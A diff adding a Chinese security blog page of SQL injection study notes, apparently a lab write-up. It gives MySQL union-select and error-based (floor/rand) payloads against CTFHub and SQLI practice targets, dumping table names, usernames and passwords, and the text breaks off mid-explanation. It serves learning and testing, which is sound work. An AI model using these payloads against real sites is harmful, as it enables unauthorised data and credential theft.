@@ -1,0 +1,2440 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+<meta charset="utf-8">
+<!--dev siwtch-->
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name='apple-mobile-web-app-capable' content='yes'/>
+<meta name='full-screen' content='true'/>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--dev switch end-->
+<meta name="description" content="本站由哨兵安全实验室支持创办">
+
+    <meta name="baidu-site-verification" content="codeva-Bt0LqEvH6L" />
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-TJ5SFQ4KCM"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-TJ5SFQ4KCM');
+</script>
+<link rel="shortcut icon" href="/assets/img/favicon.png">
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="© 哨兵" />
+
+
+
+
+<!-- Open Graph metadata -->
+<meta property="og:type" content="website" />
+<meta property="og:title" content="SQL注入学习记录 | © 哨兵" />
+<meta property="og:description" content=" &lt;div class=&quot;container mtb&quot;&gt;
+    &lt;div class=&quot;row d-flex &quot;&gt;
+        &lt;!-- SINGLE POST --&gt;
+        &lt;div class=&quot;col-lg-8 markdown-body-img flex-column&quot;&gt;
+            &lt;!-- Blog Post  --&gt;
+            &lt;a href=&quot;/blog/2022/SQL注入学习记录/&quot;&gt;&lt;h1 class=&quot;ctitle&quot;&gt;SQL注入学习记录&lt;/h1&gt;&lt;/a&gt;
+            &lt;csmall&gt;&lt;div class=&quot;d-flex items-center&quot;&gt;
+                &lt;!--article author end--&gt;
+
+&lt;!-- site build time set to the latest time.--&gt;
+
+&lt;!-- post time--&gt;
+
+
+
+
+
+&lt;div class=&quot;ml-hide&quot;&gt;
+    &lt;a class=&quot;f2 d-flex color-fg-default&quot; href=&quot;https://github.com/Yang2635&quot; target=&quot;_blank&quot;&gt;
+        Yang2635
+
+        
+            
+            &lt;!-- wrench time--&gt;
+            
+        edited
+        
+
+        
+        
+        
+        
+        
+
+        
+            on Jan 17, 2022
+        
+    &lt;/a&gt;
+&lt;/div&gt;
+            &lt;/div&gt;&lt;/csmall&gt;
+            &lt;div class=&quot;post-content&quot;&gt; 
+            &lt;p&gt;该SQL注入文档是自己学习过程中的记录汇集（不涉及WAF拦截或参数过滤），文档中涉及到的数据库管理系统为MySQL。现将文档整理出来，留作自己的学习记录历程。每个注入类型将会有一到两个例子辅助说明。&lt;/p&gt;
+
+&lt;h2 id=&quot;sql-整型注入&quot;&gt;SQL 整型注入&lt;/h2&gt;
+
+&lt;h3 id=&quot;相关知识&quot;&gt;相关知识&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;一、常用函数&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;1、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;database()&lt;/code&gt;：当前网站使用的数据库。
+2、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version()&lt;/code&gt;：当前MySQL版本。
+3、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user()&lt;/code&gt;：当前MySQL的用户。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;二、关于information_schema的数据库&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;MySQL默认有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;information_schema&lt;/code&gt;的数据库，该库中有三个表名，功能分别如下：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SCHEMATA&lt;/code&gt;：存储该用户创建的所有数据库的库名，记录库名的字段为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SCHEMA_NAME&lt;/code&gt;。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TABLES&lt;/code&gt;：存储该用户创建的所有数据库的库名和表名，记录库名和表名的字段为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TABLE_SCHEMA&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TABLE_NAME&lt;/code&gt;。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;COLUMNS&lt;/code&gt;：存储该用户创建的所有数据库的库名、表名和字段名，库名、表名和字段名为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TABLE_SCHEMA&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TABLE_NAME&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;COLUMN_NAME&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;三、union函数&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union&lt;/code&gt;操作符将两个SQL查询语句连接了起来，当设置某个参数不存在时，由于没有该参数的数据，因此会返回&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union&lt;/code&gt;后的查询语句的结果。&lt;/p&gt;
+
+&lt;h3 id=&quot;相关练习&quot;&gt;相关练习&lt;/h3&gt;
+
+&lt;h4 id=&quot;ctfhub整数型注入&quot;&gt;CTFHub(整数型注入)&lt;/h4&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/20/20210720105814.png&quot; alt=&quot;image-20210720104213808&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;1、先简单试着输入了几个数字测试，到3时就无输出了，接着尝试&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 and 1=1&lt;/code&gt;成功出结果，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 and 1=2 &lt;/code&gt; 无结果，SQL语句成功执行，存在注入点。再用联合查询&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;order by&lt;/code&gt;测试回显字段数，结果测试到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 order by 3&lt;/code&gt;时与前面的输出不同，则字段数为2。&lt;/p&gt;
+
+&lt;p&gt;2、接下来就是使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union&lt;/code&gt;函数联合搜索了，由于字段数为2，故尝试&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select 1,2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功执行，回显的字段如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/20/20210720162315.png&quot; alt=&quot;image-20210720162314988&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;说明两个字段位置都可以回显。&lt;/p&gt;
+
+&lt;p&gt;3、接下来就是枚举出当前的数据库名，语句如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select 1, databases()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功出当前库名：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/20/20210720155928.png&quot; alt=&quot;image-20210720155928827&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;4、当前数据库名出来后接着联合搜索表名，使用语句如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-myaql&quot;&gt;-1 union select group_concat(table_name),2 from information_schema.tables where table_schema=&#39;sqli&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;发现在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;information_schema&lt;/code&gt;中查到两张表，如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/20/20210720161032.png&quot; alt=&quot;image-20210720161032&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;5、查到flag表后，接下来就是继续拼接命令查字段名，如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select group_concat(column_name),2 from information_schema.columns where table_name=&#39;flag&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;查找到flag字段：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/20/20210720161530.png&quot; alt=&quot;image-20210720161530240&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;6、根据库名、表名和字段名查字段值，命令如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select flag,2 from sqli.flag
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;执行，成功得到flag&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/20/20210720161957.png&quot; alt=&quot;image-20210720161957484&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;sqliseries-2&quot;&gt;SQLI(SERIES-2)&lt;/h4&gt;
+
+&lt;p&gt;1、先尝试添加一下&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?id=1&#39;&lt;/code&gt;结果报错：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/20/20210720171725.png&quot; alt=&quot;image-20210720171725054&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接着再在上面的基础上在加一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&#39;&lt;/code&gt;号，继续报错，如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/20/20210720171911.png&quot; alt=&quot;image-20210720171910934&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;同时再用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 and 1=1&lt;/code&gt;（成功）和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 and 1=2&lt;/code&gt;（失败）命令简单判断了存在的是整型注入，此时根据上述的错误提示确定相关SQL执行语句大致为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;select * from * where id=$id limit 0,1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;确定存在有整数注入。&lt;/p&gt;
+
+&lt;p&gt;2、使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;order by&lt;/code&gt;来确定字段数，到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 order by 4&lt;/code&gt;时返回错误，可知字段数为3：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/20/20210720172257.png&quot; alt=&quot;image-20210720172256959&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;3、枚举当前数据库，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select 1, 2, database()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/20/20210720174709.png&quot; alt=&quot;image-20210720174709025&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可知当前数据库名为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security&lt;/code&gt;。当然此处也可以通过构建语句如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select 1,group_concat(schema_name),3 from information_schema.schemata
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;即在information_schema表中查看数据库中的库名，如下图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/20/20210720175447.png&quot; alt=&quot;image-20210720175446894&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;若库多的话就会不了解当前数据库对应库名，此处除了数据库默认的相关库之外，只有额外的3个库，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dvwa&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;challenges&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security&lt;/code&gt;，简单排除测试以了解其当前数据库即可。&lt;/p&gt;
+
+&lt;p&gt;4、枚举&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security&lt;/code&gt;下的表名，使用的语句如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功得到表名:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/20/20210720180036.png&quot; alt=&quot;image-20210720180035937&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;5、枚举字段名，使用的语句如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功拿到相关字段名：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/20/20210720180353.png&quot; alt=&quot;image-20210720180352999&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;6、枚举字段的数据项，使用的语句如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select 1,group_concat(username),group_concat(password) from users
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功拿到用户名与密码：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/20/20210720180903.png&quot; alt=&quot;image-20210720180903711&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;sql-字符型注入&quot;&gt;SQL 字符型注入&lt;/h2&gt;
+
+&lt;h3 id=&quot;相关知识-1&quot;&gt;相关知识&lt;/h3&gt;
+
+&lt;p&gt;字符型SQL注入的关键——&lt;strong&gt;引号的闭合&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;MySQL数据库对于引号的规则如下：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;引号必须成对出现，否则数据库就会报错。&lt;/li&gt;
+  &lt;li&gt;如果两个引号之间内容为空，数据库自动忽略。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;MySQL 有三种常用注释符：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-- &lt;/code&gt;：注意，这种注释符后边有一个空格，也可以是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--+&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--%20&lt;/code&gt;或&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-- &#39;&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-- #&lt;/code&gt;等&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt;：通过#进行注释&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/* */&lt;/code&gt;：注释掉符号内的内容&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;相关练习-1&quot;&gt;相关练习&lt;/h3&gt;
+
+&lt;h4 id=&quot;sqliseries-1&quot;&gt;SQLI(SERIES-1)&lt;/h4&gt;
+
+&lt;p&gt;1、先尝试一下&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?id=1&lt;/code&gt;，此时命令正常执行，如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721111630.png&quot; alt=&quot;image-20210721111623071&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接下来就是判断此SQL是整数型注入还是字符型注入了，基于上条命令在后面添加 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&#39;&lt;/code&gt; 尝试一下，此时页面显示错误，可见单引号被后台数据库成功执行，如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721111938.png&quot; alt=&quot;image-20210721111938416&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;再在后面添加一个 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&#39;&lt;/code&gt; ，此时的SQL执行条件语句为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?id=1&#39;&#39;&lt;/code&gt;，正常执行：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721112157.png&quot; alt=&quot;image-20210721112125505&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后在基于and条件命令来验证一下判断，使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&#39; and 1=1&lt;/code&gt;报错，无法进行注入，故加注释来进行绕过，尝试&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&#39; and 1=1 -- &#39;&lt;/code&gt;成功执行，如下图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721114906.png&quot; alt=&quot;image-20210721114906701&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;后又执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&#39; and 1=2 -- &#39;&lt;/code&gt;，逻辑判断错误，报错。此时可以根据上述执行结果确定后台执行的SQL命令语句大致为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;select * from * where id=&#39;$id&#39; limit 0,1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;存在字符型注入。&lt;/p&gt;
+
+&lt;p&gt;2、使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;order by&lt;/code&gt;确定字段数，先拼接的字符串为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&#39; order by 1 --+&#39;&lt;/code&gt;，当尝试到4的时候返回了错误，则可以确定字段数为3，如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721120745.png&quot; alt=&quot;image-20210721120745684&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;3、使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union&lt;/code&gt;来判断各字段的类型以及判断能够在页面显示的字段，语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1&#39; union select 1,2,3 --+&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721121147.png&quot; alt=&quot;image-20210721121119026&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;第二个和第三个字段成功回显。&lt;/p&gt;
+
+&lt;p&gt;4、开始枚举数据库名，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1&#39; union select 1,2,database() --+&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;获取到当前数据库名：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721121349.png&quot; alt=&quot;image-20210721121325626&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;5、枚举表名，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;结果如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721121851.png&quot; alt=&quot;image-20210721121850930&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;6、枚举字段名，语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;结果如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721122125.png&quot; alt=&quot;image-20210721122125062&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;7、枚举字段的字段值，语句如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1&#39; union select 1,group_concat(username),group_concat(password) from users --+&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;结果如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721122729.png&quot; alt=&quot;image-20210721122729290&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;sql-报错注入&quot;&gt;SQL 报错注入&lt;/h2&gt;
+
+&lt;h3 id=&quot;相关知识-2&quot;&gt;相关知识&lt;/h3&gt;
+
+&lt;p&gt;产生原因：MySQL报错注入通过构造相关语句让信息通过错误提示回显出来，主要应用于查询不回现内容，会打印错误信息；Update、insert等语句，会打印相关错误的信息。&lt;/p&gt;
+
+&lt;h4 id=&quot;主键重复报错&quot;&gt;主键重复报错&lt;/h4&gt;
+
+&lt;p&gt;利用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;floor()&lt;/code&gt;函数使SQL语句报错，实际上是由&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;count()&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rand()&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;group by&lt;/code&gt;三个函数语句联合使用造成的。&lt;/p&gt;
+
+&lt;p&gt;使用到的相关函数介绍如下：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;count()&lt;/code&gt;：该函数返回匹配指定条件的行数。count(*)函数返回表中的记录数。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;floor()&lt;/code&gt;：该函数是用来向下取整的，相当于去掉小数部分。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rand()&lt;/code&gt;：该函数是随机取(0,1)中的一个数。但是给它一个参数0后，即&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rand(0)&lt;/code&gt;，并且传给&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;floor()&lt;/code&gt;后，即：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;floor(rand(0)*2)&lt;/code&gt;它就不再是随机了，是一个序列 0110110。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;concat()&lt;/code&gt;：用于连接两个字符串。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;group by x&lt;/code&gt;：根据x的规则对数据进行分组，分组时，MySQL会建立一个临时空表进行分组。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x26&lt;/code&gt;：16进制数值，ASCII为“&amp;amp;”，在回显中起到分隔作用，可换其它。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;报错注入使用到的相关构造语句如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;语句一：
+select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x;
+
+语句二：
+select count(*) from information_schema.tables group by concat((查询语句),floor(rand(0)*2))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;注：该语句将输出字符长度限制为64个字符。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;上述两个语句原理基本是相同的，下面由里向外主要分析一下上方第一条相关语句：&lt;/p&gt;
+
+&lt;p&gt;上述语句中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;floor(rand(0)*2)&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rand()&lt;/code&gt;函数会随机产生[0,1)之间的浮点数，如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721182143.png&quot; alt=&quot;image-20210721182143721&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;且&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rand()&lt;/code&gt;函数可以自己设置随机种子，即&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rand(N)&lt;/code&gt;，这个时候产生的随机数是伪随机数，也就是说多次生成的随机数是相同的，如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721182229.png&quot; alt=&quot;image-20210721182229383&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;floor(N)&lt;/code&gt;函数会返回一个小于或等于传入的参数的最大整数（相当于截断小数部分），如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721182335.png&quot; alt=&quot;image-20210721182335687&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;多次尝试后可以看出&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;floor(rand(0)*2)&lt;/code&gt;的值是相同的，为011011011，这也是整个报错语句的关键。&lt;/p&gt;
+
+&lt;p&gt;接下来分析&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;concat()&lt;/code&gt;函数，该函数主要作用是拼接字符串，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x26&lt;/code&gt;的ASCII码是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;&lt;/code&gt;，主要是用于分割其他字符串，就可以快速定位相关信息，括号后面有个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt;，是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;as x&lt;/code&gt;的简写，即前面语句的另一个名字，主要是为了减少重复复杂的语句。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721183349.png&quot; alt=&quot;image-20210721183349680&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;后面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;group by x&lt;/code&gt;与&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;count(*)&lt;/code&gt;上述函数功能已介绍，其常用用法如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/21/20210721185203.png&quot; alt=&quot;image-20210721185203428&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;最初时，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user-count(*)&lt;/code&gt;这个数据表是空的，由MySQL临时创建出来的，通过上述命令一行一行读取原数据表&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql.user&lt;/code&gt;字段，如果读到的字段在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user-count(*)&lt;/code&gt;不存在，就将它插入，并且将对应的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;count(*)&lt;/code&gt;赋为1，如果存在，就将其对应的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;count(*)+1&lt;/code&gt;，直至扫完整个数据表。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;rand(0)*2报错原理：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;原因是因为&lt;strong&gt;rand()函数在查询的时候会执行一次，插入的时候还会执行一次。&lt;/strong&gt;这就是整个语句报错的关键，从上述&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;floor(rand(0)*2)&lt;/code&gt;图中可以看到在一次多记录的查询过程中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;floor(rand(0)*2)&lt;/code&gt;的值是定性的，为011011…(这个顺序很重要)，相关流程如下：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;查询前默认会建立空的虚拟表&lt;/li&gt;
+  &lt;li&gt;取第一条记录，执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;floor(rand(0)*2)&lt;/code&gt;，发现结果为0(第一次计算)，查询虚拟表，发现0的键值不存在，则&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;floor(rand(0)*2)&lt;/code&gt;会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕&lt;/li&gt;
